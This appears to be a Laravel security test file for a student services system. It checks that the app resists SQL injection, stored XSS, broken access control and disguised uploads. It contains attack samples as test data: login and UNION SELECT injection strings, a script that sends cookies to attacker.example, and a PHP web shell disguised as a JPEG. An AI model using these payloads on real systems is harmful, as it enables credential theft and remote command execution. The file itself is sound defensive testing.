<?php

namespace Tests\Feature;

use App\Models\DocumentRequest;
use App\Models\DocumentType;
use App\Models\User;
use App\Services\DocumentRequestService;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;

/**
 * Security tests for the three vulnerabilities in the project paper:
 * SEC-01 SQL injection, SEC-02 stored XSS, SEC-03 broken access control.
 */
class SecurityTest extends SsisTestCase
{
    private const XSS = "<script>fetch('https://attacker.example/c?'+document.cookie)</script>";

    // ----- SEC-01 SQL injection -----

    public function test_sql_injection_in_the_login_form_does_not_log_in(): void
    {
        $this->makeUser('Administrator');

        foreach (["' OR '1'='1' -- ", "admin'--", "' OR 1=1 LIMIT 1 -- "] as $payload) {
            $this->post('/login', ['username' => $payload, 'password' => 'anything'])->assertSessionHasErrors('username');
            $this->assertGuest();
        }
    }

    public function test_sql_injection_in_student_search_returns_no_rows(): void
    {
        $student = $this->makeStudent();
        $registrar = $this->makeUser('Registrar');

        $this->actingAs($registrar)
            ->get('/registrar/students?q='.urlencode("' OR '1'='1"))
            ->assertOk()
            ->assertDontSee($student->student_no);

        $this->actingAs($registrar)
            ->get('/registrar/students?q='.urlencode("' UNION SELECT username, password, 3, 4 FROM users -- "))
            ->assertOk()
            ->assertSee('No students found.');

        $this->assertSame(2, User::count(), 'The users table is untouched.');
    }

    // ----- SEC-02 stored XSS -----

    public function test_script_in_the_purpose_field_is_rejected(): void
    {
        $student = $this->makeStudent();

        $this->actingAs($student->user)->post('/student/requests', [
            'document_type_id' => DocumentType::first()->id, 'copies' => 1, 'purpose' => self::XSS,
        ])->assertSessionHasErrors('purpose');

        $this->assertSame(0, DocumentRequest::count());
    }

    public function test_stored_script_is_shown_as_text_in_the_registrar_queue(): void
    {
        $student = $this->makeStudent();
        $docRequest = DocumentRequestService::file($student, DocumentType::first(), 1, 'Employment');
        // Simulate a payload that reached the database some other way.
        $docRequest->forceFill(['purpose' => self::XSS, 'status' => 'Paid'])->save();

        $this->actingAs($this->makeUser('Registrar'))
            ->get("/registrar/requests/{$docRequest->reference_no}")
            ->assertOk()
            ->assertDontSee(self::XSS, false)
            ->assertSee(e(self::XSS), false);
    }

    public function test_pages_send_a_content_security_policy_that_blocks_inline_scripts(): void
    {
        $response = $this->actingAs($this->makeUser('Registrar'))->get('/dashboard');

        $csp = $response->headers->get('Content-Security-Policy');
        $this->assertStringContainsString("script-src 'self';", $csp);
        $this->assertStringNotContainsString('unsafe-inline', $csp);
        $response->assertHeader('X-Frame-Options', 'DENY');
    }

    // ----- SEC-03 broken access control -----

    public function test_student_cannot_open_staff_pages(): void
    {
        $student = $this->makeStudent();

        foreach (['/registrar/students', '/registrar/requests', '/cashier/payments', '/cashier/report', '/faculty/classes', '/department/sheets', '/clearance', '/admin/users', '/admin/audit-log'] as $url) {
            $this->actingAs($student->user)->get($url)->assertForbidden();
        }

        $this->assertDatabaseHas('audit_logs', ['action' => 'ACCESS_DENIED', 'user_id' => $student->user_id]);
    }

    public function test_staff_cannot_open_other_modules(): void
    {
        $this->actingAs($this->makeUser('Cashier'))->get('/registrar/students')->assertForbidden();
        $this->actingAs($this->makeUser('Registrar'))->get('/admin/users')->assertForbidden();
        $this->actingAs($this->makeUser('Faculty', ['department_id' => $this->ccs()]))->get('/cashier/payments')->assertForbidden();
    }

    public function test_student_cannot_view_another_students_request(): void
    {
        $owner = $this->makeStudent();
        $other = $this->makeStudent();
        $docRequest = DocumentRequestService::file($owner, DocumentType::first(), 1, 'Employment');

        $this->actingAs($owner->user)->get("/student/requests/{$docRequest->reference_no}")->assertOk();

        $this->actingAs($other->user)->get("/student/requests/{$docRequest->reference_no}")->assertNotFound();
        $this->actingAs($other->user)->get("/student/requests/{$docRequest->reference_no}/stub")->assertNotFound();
        $this->actingAs($other->user)->post("/student/requests/{$docRequest->reference_no}/cancel")->assertNotFound();
        $this->assertSame('Pending Payment', $docRequest->fresh()->status);
    }

    public function test_student_id_in_the_url_is_ignored(): void
    {
        $mine = $this->makeStudent();
        $theirs = $this->makeStudent();
        DocumentRequestService::file($theirs, DocumentType::first(), 1, 'Employment');

        $this->actingAs($mine->user)
            ->get("/student/requests?student_id={$theirs->id}")
            ->assertOk()
            ->assertSee('You have not requested any document yet.');

        $this->actingAs($mine->user)->get("/student/payments?student_id={$theirs->id}")->assertOk()->assertSee('No charges yet.');
    }

    public function test_faculty_cannot_open_another_faculty_members_grade_sheet(): void
    {
        $owner = $this->makeUser('Faculty', ['department_id' => $this->ccs()]);
        $other = $this->makeUser('Faculty', ['department_id' => $this->ccs()]);
        $section = $this->makeSection($owner, $this->makeStudent());

        $this->actingAs($other)->get("/faculty/classes/{$section->id}")->assertForbidden();
        $this->actingAs($other)->put("/faculty/classes/{$section->id}", ['action' => 'save', 'grades' => []])->assertForbidden();
    }

    // ----- Supporting control: file upload -----

    /** A 1x1 PNG. */
    private const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

    /** An upload backed by real bytes on disk, so the type is detected from the content as in production. */
    private function realUpload(string $name, string $claimedType, string $content): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'ssis');
        file_put_contents($path, $content);

        return new UploadedFile($path, $name, $claimedType, null, true);
    }

    public function test_php_file_renamed_as_image_is_rejected(): void
    {
        Storage::fake('local');
        $student = $this->makeStudent();
        $docRequest = DocumentRequestService::file($student, DocumentType::first(), 1, 'Employment');

        $shell = $this->realUpload('proof.jpg', 'image/jpeg', '<?php system($_GET["c"]); ?>');

        $this->actingAs($student->user)
            ->post("/student/requests/{$docRequest->reference_no}/proof", ['proof' => $shell, 'method' => 'E-wallet'])
            ->assertSessionHasErrors('proof');

        $this->assertSame([], Storage::disk('local')->allFiles());
    }

    public function test_real_image_proof_is_stored_privately_under_a_random_name(): void
    {
        Storage::fake('local');
        $student = $this->makeStudent();
        $docRequest = DocumentRequestService::file($student, DocumentType::first(), 1, 'Employment');

        $this->actingAs($student->user)
            ->post("/student/requests/{$docRequest->reference_no}/proof", ['proof' => $this->realUpload('receipt.png', 'image/png', base64_decode(self::PNG)), 'method' => 'E-wallet'])
            ->assertSessionHasNoErrors();

        $files = Storage::disk('local')->allFiles();
        $this->assertCount(1, $files);
        $this->assertStringNotContainsString('receipt', $files[0]);
        $this->assertDatabaseHas('payments', ['status' => 'For Verification', 'proof_file' => $files[0]]);
    }
}
